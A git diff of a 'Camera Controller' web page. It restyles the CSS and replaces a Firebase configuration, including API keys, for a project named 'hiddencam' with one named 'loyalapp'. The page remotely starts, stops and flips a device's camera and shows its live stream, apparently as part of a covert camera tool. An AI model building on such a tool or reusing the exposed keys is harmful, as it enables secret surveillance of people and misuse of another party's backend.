@@ -2,46 +2,228 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Camera Controller</title>
     <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: linear-gradient(135deg, #000000, #1a1a2e); font-family: system-ui; padding: 20px; }
-        .container { max-width: 500px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .header h1 { color: white; font-size: 28px; }
-        .header p { color: #888; font-size: 14px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         
-        .status-card { background: rgba(0,0,0,0.5); border-radius: 20px; padding: 20px; text-align: center; margin-bottom: 20px; backdrop-filter: blur(10px); }
-        .status-dot { width: 12px; height: 12px; border-radius: 50%; display: inline-block; margin-right: 8px; }
-        .online { background: #22c55e; box-shadow: 0 0 8px #22c55e; animation: pulse 1.5s infinite; }
-        .offline { background: #ef4444; }
-        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+        body {
+            background: linear-gradient(135deg, #000000, #1a1a2e);
+            font-family: system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+        }
         
-        .stream-card { background: rgba(0,0,0,0.6); border-radius: 20px; padding: 20px; backdrop-filter: blur(10px); margin-bottom: 20px; }
-        .video-container { background: #000; border-radius: 16px; overflow: hidden; aspect-ratio: 16/9; border: 2px solid #333; margin-bottom: 15px; }
-        #streamImage { width: 100%; height: 100%; object-fit: cover; }
-        .stream-info { display: flex; justify-content: space-between; color: #aaa; font-size: 13px; }
-        .fps { color: #22c55e; font-family: monospace; }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
         
-        .control-card { background: rgba(0,0,0,0.5); border-radius: 20px; padding: 20px; margin-bottom: 20px; }
-        .button-group { display: flex; gap: 15px; justify-content: center; flex-wrap: wrap; }
-        button { padding: 12px 24px; font-size: 16px; font-weight: bold; border: none; border-radius: 40px; cursor: pointer; transition: transform 0.2s; }
-        button:active { transform: scale(0.96); }
-        .btn-start { background: #22c55e; color: white; }
-        .btn-stop { background: #ef4444; color: white; }
-        .btn-flip { background: #3b82f6; color: white; }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
         
-        .quality-card { background: rgba(0,0,0,0.5); border-radius: 20px; padding: 15px; margin-bottom: 20px; }
-        .quality-title { color: white; margin-bottom: 10px; text-align: center; font-size: 14px; }
-        .quality-buttons { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
-        .quality-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); padding: 8px 20px; border-radius: 30px; color: white; cursor: pointer; }
-        .quality-btn.active { background: #22c55e; }
+        .header h1 {
+            color: white;
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
         
-        .footer { text-align: center; color: #555; font-size: 11px; margin-top: 20px; }
+        .header p {
+            color: #888;
+            font-size: 14px;
+        }
+        
+        .status-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .device-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .status-dot.online {
+            background: #22c55e;
+            box-shadow: 0 0 8px #22c55e;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .status-dot.offline {
+            background: #ef4444;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .device-name {
+            color: white;
+            font-size: 14px;
+        }
+        
+        .device-id {
+            color: #888;
+            font-size: 11px;
+            font-family: monospace;
+            margin-top: 5px;
+        }
+        
+        .stream-card {
+            background: rgba(0,0,0,0.6);
+            border-radius: 20px;
+            padding: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.15);
+            margin-bottom: 20px;
+        }
+        
+        .video-container {
+            background: #000;
+            border-radius: 16px;
+            overflow: hidden;
+            aspect-ratio: 16/9;
+            border: 2px solid #333;
+            margin-bottom: 15px;
+        }
+        
+        #streamImage {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .stream-info {
+            display: flex;
+            justify-content: space-between;
+            color: #aaa;
+            font-size: 13px;
+        }
+        
+        .fps {
+            color: #22c55e;
+            font-family: monospace;
+            font-size: 16px;
+        }
+        
+        .control-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .control-title {
+            color: white;
+            font-size: 16px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        button {
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        button:active {
+            transform: scale(0.96);
+        }
+        
+        .btn-start {
+            background: #22c55e;
+            color: white;
+            box-shadow: 0 0 10px rgba(34,197,94,0.3);
+        }
+        
+        .btn-stop {
+            background: #ef4444;
+            color: white;
+            box-shadow: 0 0 10px rgba(239,68,68,0.3);
+        }
+        
+        .btn-flip {
+            background: #3b82f6;
+            color: white;
+        }
+        
+        .quality-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .quality-title {
+            color: white;
+            margin-bottom: 10px;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .quality-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .quality-btn {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            padding: 8px 20px;
+            border-radius: 30px;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        
+        .quality-btn.active {
+            background: #22c55e;
+            border-color: #22c55e;
+        }
+        
+        .footer {
+            text-align: center;
+            color: #555;
+            font-size: 11px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -54,9 +236,9 @@
         <div class="status-card">
             <div class="device-status">
                 <span class="status-dot offline" id="statusDot"></span>
-                <span id="deviceStatus">Device Offline</span>
+                <span class="device-name" id="deviceStatus">Device Offline</span>
             </div>
-            <div class="device-id" id="deviceId" style="font-size: 11px; color:#888;">No device</div>
+            <div class="device-id" id="deviceId">No device</div>
         </div>
         
         <div class="stream-card">
@@ -79,10 +261,11 @@
         </div>
         
         <div class="control-card">
+            <div class="control-title">🎮 Camera Control</div>
             <div class="button-group">
                 <button class="btn-start" id="startBtn">▶ START</button>
                 <button class="btn-stop" id="stopBtn">⏹ STOP</button>
-                <button class="btn-flip" id="flipBtn">🔄 Flip</button>
+                <button class="btn-flip" id="flipBtn">🔄 Flip Camera</button>
             </div>
         </div>
         
@@ -90,17 +273,18 @@
     </div>
     
     <script>
-        // 🔴 Firebase Config
+        // 🔴🔴🔴 UPDATED FIREBASE CONFIG 🔴🔴🔴
         const firebaseConfig = {
-            apiKey: "AIzaSyCcstwitNGxv5osXZ9AQ0a0PDn7j-MTv-0",
-            authDomain: "hiddencam-62e2d.firebaseapp.com",
-            databaseURL: "https://hiddencam-62e2d-default-rtdb.firebaseio.com",
-            projectId: "hiddencam-62e2d",
-            storageBucket: "hiddencam-62e2d.firebasestorage.app",
-            messagingSenderId: "931792860891",
-            appId: "1:931792860891:android:602d1099f876f4688d7efe"
+            apiKey: "AIzaSyBchF49wpLnVsppEbqU2jK1dScAEmHlrtk",
+            authDomain: "loyalapp-6dde2.firebaseapp.com",
+            databaseURL: "https://loyalapp-6dde2-default-rtdb.firebaseio.com",
+            projectId: "loyalapp-6dde2",
+            storageBucket: "loyalapp-6dde2.firebasestorage.app",
+            messagingSenderId: "137421429303",
+            appId: "1:137421429303:android:20b38afceee3e4774d7db2"
         };
         
+        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         const deviceId = "web_controller";
